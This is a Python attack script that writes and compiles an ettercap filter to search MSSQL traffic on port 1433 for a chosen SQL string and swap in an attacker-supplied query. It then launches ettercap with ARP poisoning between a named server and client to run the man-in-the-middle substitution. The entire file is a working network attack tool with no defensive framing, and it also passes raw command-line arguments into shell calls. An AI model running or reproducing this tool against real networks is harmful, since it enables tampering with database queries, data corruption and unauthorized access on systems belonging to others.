#!/bin/python
import sys
import optparse
from os import system

	
def main():
	portSQL=1433

	parser = optparse.OptionParser()
	parser.add_option('-o', '--original', action="store", dest="queryOld", help="Original SQL string to be replaced", default=False)
	parser.add_option('-i', '--injected', action="store", dest="queryNew", help="New SQL string to be injected. This string must not be longer than the original!!", default=False)
	parser.add_option('-s', '--source', action="store", dest="serverIP", help="MSSQL server IP for ARP poison attack. May also use gateway IP", default=False)
	parser.add_option('-c', '--client', action="store", dest="clientIP", help="SQL cient IP for ARP poison attack", default=False)
	parser.add_option('-f', '--file', action="store", dest="fileName", help="Output fileName for the ettercap filter", default=False)
	parser.add_option('-p', '--port', action="store", dest="portSQL", help="Specifiy the MSSQL traffic port. Defaults to 1433", default=portSQL)
	options, args = parser.parse_args()
	
	if ((options.queryOld == False) or (options.queryNew == False) or (options.serverIP == False) or (options.clientIP == False) or (options.fileName == False)):
		print ('use --help to see how to use this :) ')
		exit()

	lengthqueryNew = len(options.queryNew)
	print ("New string is " + str(lengthqueryNew) +" bytes") 
	
	lengthqueryOld = len(options.queryOld)
	print ("Old string is " + str(lengthqueryOld) +" bytes")
	
	if lengthqueryNew > lengthqueryOld:
		print("New string MUST be smaller than old stirng.. this won't work.. EXITING")
		exit()
		
	differencePadding = (lengthqueryOld - lengthqueryNew) * " "
	options.queryNew = options.queryNew+differencePadding
	print("Arranged new query is: "+options.queryNew)
	queryOldHex = ""
	queryNewHex = ""
	for character in options.queryNew:
		queryNewHex += hex(ord(character)).replace('0x','\\x') + '\\x00'
	for character in options.queryOld:
		queryOldHex += hex(ord(character)).replace('0x','\\x') + '\\x00'
	
	print ("Writting ettercap filter!")
	filter = ''
	filter += 'if (ip.proto == TCP && tcp.dst == '+str(options.portSQL)+') {\n'
	filter += '       msg("SQL traffic discovered");\n'
	filter += '       if (search(DATA.data,"'+str(queryOldHex[:len(queryOldHex)-4])+'")) {\n'
	filter += '              msg("Got the string!");\n'
	filter += '              replace("'+queryOldHex[:len(queryOldHex)-4]+'","'+queryNewHex[:len(queryNewHex)-4]+'");\n'
	filter += '              msg("String replaced!!");\n'
	filter += '       }\n'
	filter += '}'
	f = open(options.fileName, "w")
	f.write(filter)
	f.close()
	
	system("etterfilter "+options.fileName+" -o "+options.fileName+".ef")
	system("ettercap -T -q -F ./"+options.fileName+".ef -M ARP:remote //"+options.serverIP+"// //"+options.clientIP+"//")
if __name__ == '__main__':
	main()
